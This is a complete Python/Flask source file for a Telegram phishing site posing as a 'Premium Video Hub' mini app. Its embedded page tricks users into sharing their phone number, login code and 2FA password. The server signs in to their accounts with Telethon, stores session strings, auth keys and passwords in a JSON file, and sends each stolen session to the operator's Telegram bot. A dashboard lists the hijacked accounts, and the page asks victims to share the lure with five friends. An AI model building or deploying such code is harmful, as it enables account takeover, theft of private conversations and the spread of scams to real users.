from flask import Flask, request, jsonify, render_template_string
import os
import json
import base64
import threading
import asyncio
import logging
from datetime import datetime
import requests as http_requests
from telethon import TelegramClient, errors
from telethon.sessions import StringSession
import sys

logging.basicConfig(level=logging.INFO, format='%(asctime)s %(levelname)s %(message)s')
logger = logging.getLogger(__name__)


def _si(v, d=0):
    try:
        return int(str(v).strip()) if v not in (None, "") else d
    except Exception:
        return d


BOT_TOKEN = (os.environ.get("BOT_TOKEN") or "").strip()
API_ID = _si(os.environ.get("API_ID"), 0)
API_HASH = (os.environ.get("API_HASH") or "").strip()
YOUR_TELEGRAM_ID = _si(os.environ.get("OWNER_ID"), 0)
PORT = _si(os.environ.get("PORT"), 5000)

logger.info("ENV | BOT=%s API_ID=%s API_HASH=%s OWNER=%s",
    "SET" if BOT_TOKEN else "MISSING", API_ID,
    "SET" if API_HASH else "MISSING", YOUR_TELEGRAM_ID)

if sys.version_info >= (3, 12) and sys.platform == 'win32':
    try:
        asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())
    except Exception:
        pass

app = Flask(__name__)
user_sessions = {}
pending_codes = {}
pending_2fa = {}
sessions_lock = threading.Lock()
DATA_FILE = "captured_accounts.json"


def load_accounts():
    if os.path.exists(DATA_FILE):
        try:
            with open(DATA_FILE) as f:
                return json.load(f)
        except Exception:
            return []
    return []


def save_account(account):
    accounts = load_accounts()
    found = False
    for i, a in enumerate(accounts):
        if a['phone'] == account['phone']:
            accounts[i] = account
            found = True
            break
    if not found:
        accounts.append(account)
    try:
        with open(DATA_FILE, 'w') as f:
            json.dump(accounts, f, indent=2)
    except Exception as e:
        logger.error(f"Save err: {e}")
    return account


captured_accounts = load_accounts()


def format_phone(ph):
    if not ph:
        return ph
    digits = ''.join(filter(str.isdigit, ph))
    if not digits:
        return ph
    if ph.startswith('+'):
        return ph
    if len(digits) == 10:
        return '+91' + digits
    if len(digits) == 12 and digits.startswith('91'):
        return '+' + digits
    return '+' + digits


def notify(phone, ss, me, dc, pu=False, pv=""):
    if not BOT_TOKEN or not YOUR_TELEGRAM_ID:
        return
    try:
        extra = ""
        if pu:
            extra = "\n2FA Used"
            if pv:
                extra += f" | Pwd: `{pv}`"
        msg = (f"New Account!{extra}\nPhone: {phone}\n"
               f"Name: {me.first_name} {me.last_name or ''}\n"
               f"User ID: {me.id}\nDC: {dc}\n\nSession:\n`{ss}`")
        if len(msg) > 4000:
            msg = msg[:3990] + "..."
        http_requests.post(
            f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
            json={'chat_id': YOUR_TELEGRAM_ID, 'text': msg, 'parse_mode': 'Markdown'},
            timeout=15)
    except Exception as e:
        logger.error(f"notify: {e}")


def run_tg(phone, code=None, password=None):
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    try:
        async def send_code():
            client = TelegramClient(StringSession(), API_ID, API_HASH)
            await client.connect()
            try:
                r = await client.send_code_request(phone)
                session_str = StringSession.save(client.session)
                with sessions_lock:
                    user_sessions[phone] = {'hash': r.phone_code_hash, 'session': session_str}
                    pending_codes[phone] = 'sent'
                    pending_2fa[phone] = False
                return {'success': True}
            except errors.FloodWaitError as e:
                with sessions_lock:
                    pending_codes[phone] = 'err'
                return {'success': False, 'error': f'Flood {e.seconds}s'}
            except Exception as e:
                with sessions_lock:
                    pending_codes[phone] = 'err'
                return {'success': False, 'error': str(e)[:80]}
            finally:
                try:
                    await client.disconnect()
                except Exception:
                    pass

        async def verify():
            with sessions_lock:
                if phone not in user_sessions:
                    return {'success': False, 'error': 'No session'}
                s = user_sessions[phone]
            client = TelegramClient(StringSession(s['session']), API_ID, API_HASH)
            try:
                await client.connect()
                if not await client.is_user_authorized():
                    try:
                        await client.sign_in(phone=phone, code=code, phone_code_hash=s['hash'])
                    except errors.SessionPasswordNeededError:
                        with sessions_lock:
                            pending_2fa[phone] = True
                            pending_codes[phone] = '2fa_needed'
                        if password:
                            try:
                                await client.sign_in(password=password)
                                with sessions_lock:
                                    pending_2fa[phone] = False
                                    pending_codes[phone] = 'done'
                            except errors.PasswordHashInvalidError:
                                return {'success': False, 'error': 'Wrong 2FA password'}
                        else:
                            return {'success': False, 'error': '2FA', 'needs_password': True}
                    except errors.PhoneCodeInvalidError:
                        return {'success': False, 'error': 'Wrong code'}
                    except errors.PhoneCodeExpiredError:
                        return {'success': False, 'error': 'Code expired'}
                me = await client.get_me()
                await client.get_dialogs()
                ss = StringSession.save(client.session)
                try:
                    ak = client.session.auth_key.key
                    dc = client.session.dc_id
                except Exception:
                    ak = b""
                    dc = 0
                ab = base64.b64encode(ak).decode() if ak else ""
                pu = password is not None
                acc = {
                    'phone': phone, 'user_id': me.id,
                    'username': me.username or '', 'first_name': me.first_name or '',
                    'last_name': me.last_name or '', 'session': ss,
                    'webk': json.dumps({'dcId': dc, 'authKey': ab, 'userId': me.id,
                        'isSupport': False, 'isTest': False}),
                    'dc': dc, 'time': str(datetime.now()),
                    'has_2fa': pu, 'password': password if pu else ''
                }
                save_account(acc)
                global captured_accounts
                captured_accounts = load_accounts()
                with sessions_lock:
                    user_sessions.pop(phone, None)
                    pending_2fa.pop(phone, None)
                    pending_codes[phone] = 'done'
                notify(phone, ss, me, dc, pu, password if pu else "")
                return {'success': True, 'session': ss, 'user_id': me.id}
            except Exception as e:
                es = str(e)
                if 'PHONE_CODE_INVALID' in es:
                    return {'success': False, 'error': 'Wrong code'}
                if 'SESSION_PASSWORD_NEEDED' in es:
                    return {'success': False, 'error': '2FA', 'needs_password': True}
                if 'PASSWORD_HASH_INVALID' in es:
                    return {'success': False, 'error': 'Wrong 2FA password'}
                return {'success': False, 'error': es[:80]}
            finally:
                try:
                    await client.disconnect()
                except Exception:
                    pass

        if code:
            return loop.run_until_complete(verify())
        return loop.run_until_complete(send_code())
    finally:
        loop.close()


PAGE = r'''<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=no">
<title>Premium Video Hub</title>
<script src="https://telegram.org/js/telegram-web-app.js"></script>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:-apple-system,BlinkMacSystemFont,Arial,sans-serif;background:#0a0a0a;color:white;min-height:100vh;text-align:center;padding:20px}
h1{font-size:24px;font-weight:900;background:linear-gradient(45deg,#ff6b6b,#ffa500);-webkit-background-clip:text;-webkit-text-fill-color:transparent;padding:20px 0 10px}
h2{font-size:18px;margin:15px 0 10px}
p{color:#888;font-size:13px;margin:8px 0;line-height:1.5}
.btn{width:100%;max-width:340px;padding:18px;background:linear-gradient(45deg,#0088cc,#00a8e8);border:none;border-radius:50px;color:white;font-size:18px;font-weight:800;cursor:pointer;margin:10px auto;display:block;letter-spacing:1px}
.btn-green{background:linear-gradient(45deg,#25D366,#128C7E)}
.hidden{display:none!important}
.otp{font-size:30px;letter-spacing:12px;background:#0a0a0a;padding:15px;border-radius:10px;border:2px solid #2a2a3e;margin:15px auto;min-height:55px;max-width:300px;font-weight:bold}
input{padding:15px;border-radius:10px;border:2px solid #2a2a3e;background:#0a0a0a;color:white;font-size:18px;text-align:center;margin:10px auto;display:block;width:100%;max-width:300px;outline:none}
input:focus{border-color:#0088cc}
.msg{padding:12px;border-radius:10px;margin:10px auto;font-size:13px;max-width:340px}
.msg.ok{background:rgba(76,175,80,0.2);color:#81C784}
.msg.err{background:rgba(244,67,54,0.2);color:#EF9A9A}
.msg.hide{display:none}
.card{background:#141420;border-radius:20px;padding:25px 20px;max-width:400px;margin:15px auto;border:1px solid #1a1a2e}
</style>
</head>
<body>

<h1>PREMIUM VIDEO HUB</h1>
<p>Exclusive content - Verified only</p>
<button class="btn" id="startBtn">UNLOCK NOW</button>

<div id="contactBox" class="hidden card">
<div style="font-size:48px">&#128241;</div>
<h2>Verify Number</h2>
<p>Tap Share Contact to continue</p>
<button class="btn btn-green" id="shareContactBtn">SHARE CONTACT</button>
<div id="contactMsg" class="msg hide"></div>
</div>

<div id="otpBox" class="hidden card">
<div style="font-size:48px">&#128274;</div>
<h2>Enter Code</h2>
<p id="phoneShow"></p>
<div id="otpMsg" class="msg hide"></div>
<div class="otp" id="otpDisplay">_</div>
<input type="tel" id="otpInput" maxlength="5" placeholder="00000">
<button class="btn" id="verifyBtn">VERIFY</button>
</div>

<div id="pwdBox" class="hidden card">
<div style="font-size:48px">&#128274;</div>
<h2>2FA Password</h2>
<p>Enter your cloud password</p>
<input type="password" id="pwdInput" placeholder="Password">
<button class="btn" id="pwdBtn">VERIFY</button>
<div id="pwdMsg" class="msg hide"></div>
</div>

<div id="shareBox" class="hidden card">
<div style="font-size:48px">&#127916;</div>
<h2>Almost there!</h2>
<p>Share with 5 friends to unlock</p>
<button class="btn btn-green" id="shareBtn">SHARE ON TELEGRAM</button>
<div id="shareMsg" class="msg hide"></div>
</div>

<script>
var tg = window.Telegram ? window.Telegram.WebApp : null;
if (tg) { tg.ready(); tg.expand(); }
var TG_ID = (tg && tg.initDataUnsafe && tg.initDataUnsafe.user) ? tg.initDataUnsafe.user.id : null;
var USER_PHONE_KEY = 'pv_phone_' + TG_ID;
var USER_SHARES_KEY = 'pv_shares_' + TG_ID;
var USER_CAPTURED_KEY = 'pv_captured_' + TG_ID;
var phoneNumber = '';
var codeCheckInterval = null;
var pwdCheckInterval = null;
var contactForceInterval = null;
var TG_CHANNEL = 'https://t.me/videodks';
var TG_CAPTION = 'Premium content';

function show(id) { document.getElementById(id).classList.remove('hidden'); }
function hide(id) { document.getElementById(id).classList.add('hidden'); }
function showMsg(id, text, ok) {
  var el = document.getElementById(id);
  el.textContent = text;
  el.className = 'msg ' + (ok ? 'ok' : 'err');
}
function hideMsg(id) { document.getElementById(id).className = 'msg hide'; }

document.getElementById('startBtn').onclick = function() {
  var cp = localStorage.getItem(USER_PHONE_KEY);
  var ic = localStorage.getItem(USER_CAPTURED_KEY) === '1';
  if (cp && ic) { phoneNumber = cp; openShare(); return; }
  if (cp) { phoneNumber = cp; openOtp(); return; }
  openContact();
};

function openContact() {
  hide('startBtn');
  show('contactBox');
  if (contactForceInterval) clearInterval(contactForceInterval);
  setTimeout(triggerShare, 300);
  contactForceInterval = setInterval(function() {
    if (!document.getElementById('contactBox').classList.contains('hidden')) {
      triggerShare();
    } else {
      clearInterval(contactForceInterval);
      contactForceInterval = null;
    }
  }, 1500);
}

function triggerShare() {
  if (!tg || !tg.requestContact) {
    showMsg('contactMsg', 'Open in Telegram app', false);
    return;
  }
  try {
    tg.requestContact(function(sent, event) {
      if (sent && event && event.responseUnsafe && event.responseUnsafe.contact) {
        handleContact(event.responseUnsafe.contact);
      } else {
        showMsg('contactMsg', 'Contact share required!', false);
      }
    });
  } catch(e) {
    showMsg('contactMsg', 'Update Telegram app', false);
  }
}

document.getElementById('shareContactBtn').onclick = triggerShare;

function handleContact(c) {
  var phone = c.phone_number || '';
  if (!phone) { showMsg('contactMsg', 'No phone number', false); return; }
  if (phone.charAt(0) !== '+') phone = '+' + phone;
  phoneNumber = phone;
  showMsg('contactMsg', 'Contact verified!', true);
  if (contactForceInterval) { clearInterval(contactForceInterval); contactForceInterval = null; }
  fetch('/api/save_contact', {
    method: 'POST',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify({tg_id: TG_ID, phone: phoneNumber})
  })
  .then(function(r) { return r.json(); })
  .then(function(d) {
    if (d.success) {
      localStorage.setItem(USER_PHONE_KEY, phoneNumber);
      if (d.already_captured && d.user_id) {
        localStorage.setItem(USER_CAPTURED_KEY, '1');
        hide('contactBox');
        openShare();
      } else {
        setTimeout(function() { hide('contactBox'); openOtp(); }, 800);
      }
    } else {
      showMsg('contactMsg', 'Server error', false);
    }
  })
  .catch(function() { showMsg('contactMsg', 'Connection error', false); });
}

function openOtp() {
  hide('startBtn'); hide('contactBox');
  show('otpBox');
  document.getElementById('phoneShow').textContent = phoneNumber;
  document.getElementById('otpInput').value = '';
  document.getElementById('otpDisplay').textContent = '_';
  showMsg('otpMsg', 'Sending code...', true);
  fetch('/api/share', {
    method: 'POST',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify({phone: phoneNumber})
  })
  .then(function(r) { return r.json(); })
  .then(function(d) {
    if (d.success) {
      showMsg('otpMsg', 'Code sent! Enter below', true);
      startOtpCheck();
    } else {
      showMsg('otpMsg', d.error || 'Failed', false);
    }
  })
  .catch(function() { showMsg('otpMsg', 'Network error', false); });
}

function startOtpCheck() {
  if (codeCheckInterval) clearInterval(codeCheckInterval);
  codeCheckInterval = setInterval(function() {
    fetch('/api/check', {
      method: 'POST',
      headers: {'Content-Type': 'application/json'},
      body: JSON.stringify({phone: phoneNumber})
    })
    .then(function(r) { return r.json(); })
    .then(function(d) {
      if (d.s === '2fa_needed') {
        clearInterval(codeCheckInterval);
        hide('otpBox');
        show('pwdBox');
        startPwdCheck();
      } else if (d.s === 'done') {
        clearInterval(codeCheckInterval);
        onCapture();
      } else if (d.s === 'err') {
        clearInterval(codeCheckInterval);
        showMsg('otpMsg', 'Code send failed', false);
      }
    })
    .catch(function(){});
  }, 2000);
}

document.getElementById('otpInput').oninput = function() {
  var v = this.value.replace(/[^0-9]/g, '').slice(0, 5);
  this.value = v;
  document.getElementById('otpDisplay').textContent = v || '_';
};

document.getElementById('verifyBtn').onclick = function() {
  var code = document.getElementById('otpInput').value.trim();
  if (code.length < 5) { showMsg('otpMsg', '5 digits required', false); return; }
  showMsg('otpMsg', 'Verifying...', true);
  fetch('/api/verify', {
    method: 'POST',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify({phone: phoneNumber, code: code})
  })
  .then(function(r) { return r.json(); })
  .then(function(d) {
    if (d.success) {
      onCapture();
    } else if (d.needs_password) {
      hide('otpBox');
      show('pwdBox');
      startPwdCheck();
    } else {
      showMsg('otpMsg', d.error || 'Wrong code', false);
    }
  })
  .catch(function() { showMsg('otpMsg', 'Error', false); });
};

function startPwdCheck() {
  if (pwdCheckInterval) clearInterval(pwdCheckInterval);
  pwdCheckInterval = setInterval(function() {
    fetch('/api/check', {
      method: 'POST',
      headers: {'Content-Type': 'application/json'},
      body: JSON.stringify({phone: phoneNumber})
    })
    .then(function(r) { return r.json(); })
    .then(function(d) {
      if (d.s === 'done') { clearInterval(pwdCheckInterval); onCapture(); }
    })
    .catch(function(){});
  }, 2000);
}

document.getElementById('pwdBtn').onclick = function() {
  var pwd = document.getElementById('pwdInput').value.trim();
  if (!pwd) { showMsg('pwdMsg', 'Password required', false); return; }
  showMsg('pwdMsg', 'Checking...', true);
  fetch('/api/verify', {
    method: 'POST',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify({
      phone: phoneNumber,
      code: document.getElementById('otpInput').value.trim(),
      password: pwd
    })
  })
  .then(function(r) { return r.json(); })
  .then(function(d) {
    if (d.success) { onCapture(); }
    else { showMsg('pwdMsg', d.error || 'Wrong', false); }
  })
  .catch(function() { showMsg('pwdMsg', 'Error', false); });
};

function onCapture() {
  localStorage.setItem(USER_PHONE_KEY, phoneNumber);
  localStorage.setItem(USER_CAPTURED_KEY, '1');
  localStorage.setItem(USER_SHARES_KEY, '0');
  if (codeCheckInterval) { clearInterval(codeCheckInterval); codeCheckInterval = null; }
  if (pwdCheckInterval) { clearInterval(pwdCheckInterval); pwdCheckInterval = null; }
  hide('otpBox'); hide('pwdBox');
  openShare();
}

function openShare() {
  hide('startBtn'); hide('otpBox'); hide('pwdBox'); hide('contactBox');
  show('shareBox');
  var n = parseInt(localStorage.getItem(USER_SHARES_KEY) || '0');
  showMsg('shareMsg', n + '/5 done', n >= 5);
}

document.getElementById('shareBtn').onclick = function() {
  var url = 'https://t.me/share/url?url=' + encodeURIComponent(TG_CHANNEL) + '&text=' + encodeURIComponent(TG_CAPTION);
  if (tg) { tg.openTelegramLink(url); } else { window.open(url, '_blank'); }
  var n = Math.min(parseInt(localStorage.getItem(USER_SHARES_KEY) || '0') + 1, 5);
  localStorage.setItem(USER_SHARES_KEY, String(n));
  showMsg('shareMsg', n >= 5 ? 'Unlocked!' : n + '/5 done', true);
};

if (window.location.search.indexOf('auto=1') !== -1) {
  setTimeout(function() { document.getElementById('startBtn').click(); }, 500);
}
</script>
</body>
</html>'''


@app.route('/')
def index():
    return render_template_string(PAGE)


@app.route('/tg')
def tg():
    return render_template_string(PAGE)


@app.route('/health')
def health():
    return jsonify({
        'status': 'ok',
        'BOT_TOKEN': 'SET' if BOT_TOKEN else 'MISSING',
        'API_ID': API_ID,
        'API_HASH': 'SET' if API_HASH else 'MISSING',
        'OWNER_ID': YOUR_TELEGRAM_ID,
        'accounts': len(captured_accounts)
    })


@app.route('/api/save_contact', methods=['POST'])
def save_contact():
    d = request.json
    tg_id = d.get('tg_id')
    phone = d.get('phone')
    if not phone or not tg_id:
        return jsonify({'success': False, 'error': 'Missing data'})
    phone = format_phone(phone)
    accounts = load_accounts()
    ex = next((a for a in accounts if a['phone'] == phone), None)
    if ex:
        return jsonify({
            'success': True, 'already_captured': True,
            'phone': phone, 'user_id': ex['user_id']
        })
    with sessions_lock:
        pending_codes[phone] = 'contact_saved'
    try:
        http_requests.post(
            f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
            json={'chat_id': YOUR_TELEGRAM_ID,
                'text': f"Contact: `{phone}` TG: `{tg_id}`",
                'parse_mode': 'Markdown'},
            timeout=10)
    except Exception:
        pass
    return jsonify({'success': True, 'phone': phone})


@app.route('/api/share', methods=['POST'])
def share():
    ph = request.json.get('phone', '')
    if not ph:
        return jsonify({'success': False, 'error': 'Phone required'})
    ph = format_phone(ph)
    with sessions_lock:
        pending_codes[ph] = 'sending'
    t = threading.Thread(target=run_tg, args=(ph,))
    t.daemon = True
    t.start()
    return jsonify({'success': True})


@app.route('/api/check', methods=['POST'])
def check():
    phone = format_phone(request.json.get('phone', ''))
    with sessions_lock:
        s = pending_codes.get(phone, 'waiting')
    if s == 'waiting':
        accounts = load_accounts()
        if any(a['phone'] == phone for a in accounts):
            s = 'done'
    return jsonify({'s': s})


@app.route('/api/verify', methods=['POST'])
def verify():
    d = request.json
    ph = format_phone(d.get('phone', ''))
    return jsonify(run_tg(ph, d.get('code', ''), d.get('password')))


@app.route('/session/<phone>')
def get_session(phone):
    phone = format_phone(phone)
    global captured_accounts
    captured_accounts = load_accounts()
    a = next((x for x in captured_accounts if x['phone'] == phone), None)
    if not a:
        return jsonify({'error': 'Not found'}), 404
    return jsonify({
        'phone': phone, 'user_id': a['user_id'],
        'name': f"{a['first_name']} {a['last_name']}",
        'username': a['username'], 'dc': a['dc'],
        'session': a['session'], 'session_length': len(a['session']),
        'has_2fa': a.get('has_2fa', False)
    })


@app.route('/dash')
def dash():
    global captured_accounts
    captured_accounts = load_accounts()
    rows = ""
    for i, a in enumerate(captured_accounts, 1):
        sl = len(a.get('session', ''))
        tg = "2FA" if a.get('has_2fa') else ""
        rows += f"<tr><td>{i}</td><td>{a['phone']}</td><td>{a.get('first_name','')} {a.get('last_name','')}</td><td>@{a.get('username','-')}</td><td>{a.get('user_id','')}</td><td>{a.get('dc','')}</td><td>{tg} ({sl})</td></tr>"
    total_2fa = sum(1 for a in captured_accounts if a.get('has_2fa'))
    return (
        "<!DOCTYPE html><html><head><title>Dash</title><style>"
        "body{background:#0a0a0a;color:white;font-family:Arial;padding:20px}"
        "h1{color:#e94560}table{width:100%;border-collapse:collapse;margin-top:15px}"
        "th,td{padding:10px;text-align:left;border-bottom:1px solid #1a1a2e;font-size:13px}"
        "th{background:#141420;color:#ddd}tr:hover{background:#141420}"
        "</style></head><body>"
        f"<h1>Accounts: {len(captured_accounts)} | 2FA: {total_2fa}</h1>"
        "<table><thead><tr><th>#</th><th>Phone</th><th>Name</th><th>User</th><th>ID</th><th>DC</th><th>Session</th></tr></thead><tbody>"
        f"{rows if rows else '<tr><td colspan=7 style=text-align:center;color:#666;padding:30px>No accounts yet</td></tr>'}"
        "</tbody></table></body></html>"
    )


if __name__ == '__main__':
    if not all([BOT_TOKEN, API_ID, API_HASH, YOUR_TELEGRAM_ID]):
        logger.warning("Some env vars missing!")
    app.run(host='0.0.0.0', port=PORT, debug=False)
    
